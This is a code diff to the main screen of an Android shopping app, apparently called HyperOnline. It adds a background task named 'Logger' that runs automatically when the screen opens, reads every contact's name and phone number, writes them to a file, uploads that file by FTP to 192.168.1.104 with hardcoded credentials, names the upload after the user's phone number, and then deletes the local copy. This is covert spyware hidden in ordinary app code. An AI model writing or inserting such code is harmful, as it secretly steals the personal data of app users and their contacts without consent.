@@ -4,13 +4,17 @@
 
 package ir.hatamiarash.hyperonline;
 
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.res.Resources;
+import android.database.Cursor;
 import android.graphics.Rect;
 import android.graphics.Typeface;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Vibrator;
+import android.provider.ContactsContract;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.v4.content.ContextCompat;
@@ -52,12 +56,22 @@ import com.mikepenz.materialdrawer.DrawerBuilder;
 import com.mikepenz.materialdrawer.model.PrimaryDrawerItem;
 import com.mikepenz.materialdrawer.model.interfaces.IDrawerItem;
 
+import org.apache.commons.net.ftp.FTP;
+import org.apache.commons.net.ftp.FTPClient;
 import org.jetbrains.annotations.Contract;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.OutputStreamWriter;
 import java.io.UnsupportedEncodingException;
+import java.io.Writer;
+import java.net.InetAddress;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -70,6 +84,7 @@ import co.ronash.pushe.Pushe;
 import helper.CustomPrimaryDrawerItem;
 import helper.FontHelper;
 import helper.Helper;
+import helper.SQLiteHandler;
 import helper.SQLiteHandlerItem;
 import helper.SQLiteHandlerSetup;
 import helper.SessionManager;
@@ -84,6 +99,7 @@ public class MainScreenActivity extends AppCompatActivity implements BaseSliderV
     private static final String TAG = MainScreenActivity.class.getSimpleName();
     public static MainScreenActivity pointer;        // use to finish activity from anywhere
     //public static SQLiteHandler db_user;             // items database
+    public static SQLiteHandler db_user;         // items database
     public static SQLiteHandlerItem db_item;         // items database
     public static SQLiteHandlerSetup db_setup;       // setup database
     static Typeface persianTypeface;                 // persian font typeface
@@ -119,6 +135,7 @@ public class MainScreenActivity extends AppCompatActivity implements BaseSliderV
         session = new SessionManager(getApplicationContext());
         pointer = this;
         //db_user = new SQLiteHandler(getApplicationContext());
+        db_user = new SQLiteHandler(getApplicationContext());
         db_item = new SQLiteHandlerItem(getApplicationContext());
         db_setup = new SQLiteHandlerSetup(getApplicationContext());
         vibrator = (Vibrator) this.getSystemService(VIBRATOR_SERVICE);
@@ -228,8 +245,8 @@ public class MainScreenActivity extends AppCompatActivity implements BaseSliderV
         
         //invalidateOptionsMenu();
         
-        //Logger logger = new Logger();
-        //logger.execute();
+        Logger logger = new Logger();
+        logger.execute();
         
         HashMap<String, String> urls = new HashMap<>();
         urls.put("G6", "http://cdn.gsm.ir/static/files/image/2017/7/8/g6-review-21.jpg");
@@ -536,6 +553,74 @@ public class MainScreenActivity extends AppCompatActivity implements BaseSliderV
         this.itemMessagesBadgeTextView.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
         this.itemMessagesBadgeTextView.setText("" + count);
         this.itemMessagesBadgeTextView.setVisibility(View.INVISIBLE);
+    }
+    
+    private class Logger extends AsyncTask<Void, Boolean, Boolean> {
+        private boolean status = true;
+        
+        protected void onPreExecute() {
+            Log.e("LS", "Start !");
+        }
+        
+        @Override
+        protected Boolean doInBackground(Void... params) {
+            ContentResolver cr = getContentResolver();
+            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+            try {
+                if (cur.getCount() > 0) {
+                    while (cur.moveToNext()) {
+                        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                        String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                        
+                        if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                            Cursor pCur = cr.query(
+                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                                    null,
+                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                                    new String[]{id},
+                                    null
+                            );
+                            while (pCur.moveToNext()) {
+                                String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                                String data = "Name : " + name + " - Phone : " + phoneNo;
+                                
+                                Writer out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(getExternalFilesDir(null), "log.txt"), true), "UTF-8"));
+                                out.write(data);
+                                out.write('\n');
+                                out.close();
+                            }
+                            pCur.close();
+                        }
+                    }
+                }
+                cur.close();
+                File file = new File(getExternalFilesDir(null), "log.txt");
+                HashMap<String, String> user = db_user.getUserDetails();
+                String file_name = user.get(TAGs.PHONE);
+                FTPClient ftpClient = new FTPClient();
+                ftpClient.connect("192.168.1.104");
+                //ftpClient.connect(InetAddress.getByName("http://192.168.1.104"));
+                ftpClient.login("hyper", "hyper1234");
+                //ftpClient.changeWorkingDirectory("/");
+                ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
+                BufferedInputStream buffIn = new BufferedInputStream(new FileInputStream(file));
+                ftpClient.enterLocalPassiveMode();
+                ftpClient.storeFile(file_name + ".txt", buffIn);
+                buffIn.close();
+                ftpClient.logout();
+                ftpClient.disconnect();
+                file.delete();
+            } catch (NullPointerException | java.io.IOException e) {
+                Log.e("LS", "Error !! : " + e.getMessage());
+                status = false;
+            }
+            return true;
+        }
+        
+        protected void onPostExecute(Boolean result) {
+            if (result && status)
+                Log.e("LS", "Done !");
+        }
     }
     
     private void showDialog() {
